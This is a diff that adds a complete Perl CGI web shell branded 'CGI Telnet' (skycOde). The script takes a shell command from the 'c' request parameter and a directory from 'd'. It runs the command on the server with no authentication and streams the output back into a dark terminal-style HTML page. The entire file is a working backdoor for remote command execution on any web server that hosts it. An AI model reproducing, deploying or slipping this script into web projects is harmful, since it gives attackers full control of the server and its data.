@@ -1,0 +1,180 @@
+#!/usr/bin/perl -I/usr/local/bandmain
+$WinNT = 0;		
+$NTCmdSep = "&";
+$UnixCmdSep = ";";
+$CommandTimeoutDuration = 10;
+$ShowDynamicOutput = 1;	
+$CmdSep = ($WinNT ? $NTCmdSep : $UnixCmdSep);
+$CmdPwd = ($WinNT ? "cd" : "pwd");
+$PathSep = ($WinNT ? "\\" : "/");
+$Redirector = ($WinNT ? " 2>&1 1>&2" : " 1>&1 2>&1");
+sub ReadParse 
+{
+	local (*in) = @_ if @_;
+	local ($i, $loc, $key, $val);
+	
+	$MultipartFormData = $ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/;
+
+	if($ENV{'REQUEST_METHOD'} eq "GET")
+	{
+		$in = $ENV{'QUERY_STRING'};
+	}
+	elsif($ENV{'REQUEST_METHOD'} eq "POST")
+	{
+		binmode(STDIN) if $MultipartFormData & $WinNT;
+		read(STDIN, $in, $ENV{'CONTENT_LENGTH'});
+	}
+
+	# handle file upload data
+	if($ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/)
+	{
+		$Boundary = '--'.$1; # please refer to RFC1867 
+		@list = split(/$Boundary/, $in); 
+		$HeaderBody = $list[1];
+		$HeaderBody =~ /\r\n\r\n|\n\n/;
+		$Header = $`;
+		$Body = $';
+ 		$Body =~ s/\r\n$//; # the last \r\n was put in by Netscape
+		$in{'filedata'} = $Body;
+		$Header =~ /filename=\"(.+)\"/; 
+		$in{'f'} = $1; 
+		$in{'f'} =~ s/\"//g;
+		$in{'f'} =~ s/\s//g;
+
+		# parse trailer
+		for($i=2; $list[$i]; $i++)
+		{ 
+			$list[$i] =~ s/^.+name=$//;
+			$list[$i] =~ /\"(\w+)\"/;
+			$key = $1;
+			$val = $';
+			$val =~ s/(^(\r\n\r\n|\n\n))|(\r\n$|\n$)//g;
+			$val =~ s/%(..)/pack("c", hex($1))/ge;
+			$in{$key} = $val; 
+		}
+	}
+	else # standard post data (url encoded, not multipart)
+	{
+		@in = split(/&/, $in);
+		foreach $i (0 .. $#in)
+		{
+			$in[$i] =~ s/\+/ /g;
+			($key, $val) = split(/=/, $in[$i], 2);
+			$key =~ s/%(..)/pack("c", hex($1))/ge;
+			$val =~ s/%(..)/pack("c", hex($1))/ge;
+			$in{$key} .= "\0" if (defined($in{$key}));
+			$in{$key} .= $val;
+		}
+	}
+}
+sub PrintPageHeader
+{
+	$EncodedCurrentDir = $CurrentDir;
+	$EncodedCurrentDir =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
+	print "Content-type: text/html\n\n";
+	print <<END;
+
+<style type="text/css">
+	.kodline{border:0px;background:transparent;color:#0F0;height:30px;width:100%;font-family:Arial;font-size:18px}
+	.kodline:hover{background:#666}
+	.kodline:focus{background:#222}
+::-moz-selection { background: #F00; color: #FFF;}
+::selection { background: #F00; color: #FFF;}
+a::-moz-selection { background: #F00; color: #FFF;}
+a::selection { background: #F00; color: #FFF;}
+</style>
+<body>
+<div style="position:absolute;left:0px;top:0px;right:0px;height:26px;font: bold 20px 'Calibri', Arial ;background-color:#444;text-align:center;color:#FFF">CGI Telnet</div>
+<div style="position:absolute;left:0px;top:26px;right:0px;bottom:30px;background-color:#111;padding:10px;color:#FFF;overflow:scroll;overflow-x:hidden;">
+	<font color="#777">/:\skycOde CGI-TELNET/:\<br></font>
+	
+END
+}
+
+
+
+
+sub PrintCommandLineInputForm
+{
+	
+	print <<END;
+ </div>
+<div style="position:absolute;left:0px;right:0px;bottom:0px;;height:30px;background-color:#444">
+	<script>
+		function cgipresskey(e){
+			if(typeof event!='undefined'){pressedkey=window.event.keyCode}else{pressedkey=e.keyCode}	
+			if(pressedkey==13){document.getElementById('gonder').click();}
+		}
+	</script>
+	<form method="POST" action="$ScriptLocation">
+	<input type="text" class="kodline" name="c" onkeyup="cgipresskey(event)">
+	<input type="hidden" name="d" value="$CurrentDir">
+	<input type="submit" id="gonder" style="visibility:hidden" value="Enter">
+	</form>
+</div>
+
+END
+}
+
+sub ExecuteCommand
+{
+	if($RunCommand =~ m/^\s*cd\s+(.+)/) 
+	{
+
+		$OldDir = $CurrentDir;
+		$Command = "cd \"$CurrentDir\"".$CmdSep."cd $1".$CmdSep.$CmdPwd;
+		chop($CurrentDir = `$Command`);
+		&PrintPageHeader("c");
+ 		print "<font color=#EF2929>$OldDir # </font><font color=#4594D4>$RunCommand </font><br>";
+		
+		print "<font color=#FF0>New Path : </font><font color=#FFF>$CurrentDir</font><br>";
+		
+	}
+	else # some other command, display the output
+	{
+		&PrintPageHeader("c");
+		
+		print "<font color=#EF2929>$CurrentDir # </font><font color=#4594D4>$RunCommand </font><font style=\"font-family:'Lucida Console';font-size:12px\"><xmp>";
+		$Command = "cd \"$CurrentDir\"".$CmdSep.$RunCommand.$Redirector;
+		if(!$WinNT)
+		{
+			$SIG{'ALRM'} = \&CommandTimeout;
+			alarm($CommandTimeoutDuration);
+		}
+		if($ShowDynamicOutput) # show output as it is generated
+		{
+			$|=1;
+			$Command .= " |";
+			open(CommandOutput, $Command);
+			while(<CommandOutput>)
+			{
+				$_ =~ s/(\n|\r\n)$//;
+				print "$_\n";
+			}
+			$|=0;
+		}
+		else # show output after command completes
+		{
+			print `$Command`;
+		}
+		if(!$WinNT)
+		{
+			alarm(0);
+		}
+		print "</xmp></font>";
+	}
+	&PrintCommandLineInputForm;
+}
+&ReadParse;
+$ScriptLocation = $ENV{'SCRIPT_NAME'};
+$ServerName = $ENV{'SERVER_NAME'};
+$RunCommand = $in{'c'};
+$CurrentDir = $in{'d'};
+chop($CurrentDir = `$CmdPwd`) if($CurrentDir eq "");
+
+
+	&ExecuteCommand;
+
+
+
+               
